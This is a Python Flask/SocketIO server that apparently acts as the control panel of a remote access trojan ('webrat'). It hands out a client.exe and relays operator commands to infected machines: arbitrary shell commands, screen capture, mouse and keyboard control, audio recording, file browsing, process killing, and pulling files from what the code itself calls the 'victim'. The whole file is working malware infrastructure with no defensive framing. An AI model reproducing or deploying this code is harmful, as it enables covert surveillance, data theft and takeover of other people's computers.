from flask import Flask, render_template, request, send_from_directory
from flask_socketio import SocketIO, emit
import eventlet
eventlet.monkey_patch()

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key_webrat'
socketio = SocketIO(app, cors_allowed_origins="*")

agents = {}
viewer_requests = {}

@app.route('/')
def index():
    return render_template('index.html')

# --- МАРШРУТ ДЛЯ СКАЧИВАНИЯ КЛИЕНТА С САЙТА ---
@app.route('/download/client.exe')
def download_client():
    return send_from_directory('static', 'client.exe', as_attachment=True)

@socketio.on('connect')
def handle_browser_connect():
    emit('update_user_list', list(agents.keys()))

@socketio.on('connect_agent')
def handle_agent_connect(data):
    ip = data.get('ip')
    agents[ip] = request.sid
    emit('update_user_list', list(agents.keys()), broadcast=True)

@socketio.on('request_view')
def handle_view_request(data):
    target_ip = data.get('ip')
    browser_sid = request.sid
    if target_ip in agents:
        viewer_requests[target_ip] = browser_sid
        socketio.emit('request_screen', {'ip': target_ip}, room=agents[target_ip])

@socketio.on('screen_captured')
def handle_screen_data(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_screen', data, room=viewer_requests[target_ip])

@socketio.on('execute_command')
def handle_execute_command(data):
    target_ip = data.get('ip')
    command = data.get('command')
    if target_ip in agents:
        socketio.emit('run_shell_command', {'ip': target_ip, 'command': command}, room=agents[target_ip])

@socketio.on('command_result')
def handle_command_result(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_command_result', data, room=viewer_requests[target_ip])

@socketio.on('get_sysinfo')
def handle_get_sysinfo(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('request_sysinfo', {'ip': target_ip}, room=agents[target_ip])

@socketio.on('sysinfo_result')
def handle_sysinfo_result(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_sysinfo', data, room=viewer_requests[target_ip])

@socketio.on('mouse_move')
def handle_mouse_move(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('mouse_move', data, room=agents[target_ip])

@socketio.on('mouse_click')
def handle_mouse_click(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('mouse_click', data, room=agents[target_ip])

@socketio.on('type_text')
def handle_type_text(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('type_text', data, room=agents[target_ip])

@socketio.on('key_press')
def handle_key_press(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('key_press', data, room=agents[target_ip])

@socketio.on('upload_file')
def handle_upload_file(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('receive_file', data, room=agents[target_ip])

@socketio.on('request_download')
def handle_request_download(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('send_me_file', data, room=agents[target_ip])

@socketio.on('file_uploaded_from_victim')
def handle_file_from_victim(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('download_file', data, room=viewer_requests[target_ip])

@socketio.on('start_audio_capture')
def handle_start_audio_capture(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('record_audio', data, room=agents[target_ip])

@socketio.on('audio_captured')
def handle_audio_captured(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('play_audio', data, room=viewer_requests[target_ip])

@socketio.on('open_folder')
def handle_open_folder(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('browse_folder', data, room=agents[target_ip])

@socketio.on('folder_list_result')
def handle_folder_result(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_folder_list', data, room=viewer_requests[target_ip])

@socketio.on('list_processes')
def handle_list_processes(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('list_processes', data, room=agents[target_ip])

@socketio.on('processes_result')
def handle_processes_result(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_processes', data, room=viewer_requests[target_ip])

@socketio.on('kill_process')
def handle_kill_process(data):
    target_ip = data.get('ip')
    if target_ip in agents:
        socketio.emit('kill_process', data, room=agents[target_ip])

@socketio.on('process_killed')
def handle_process_killed(data):
    target_ip = data.get('ip')
    if target_ip in viewer_requests:
        socketio.emit('display_kill_result', data, room=viewer_requests[target_ip])

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    socketio.run(app, host='0.0.0.0', port=port)
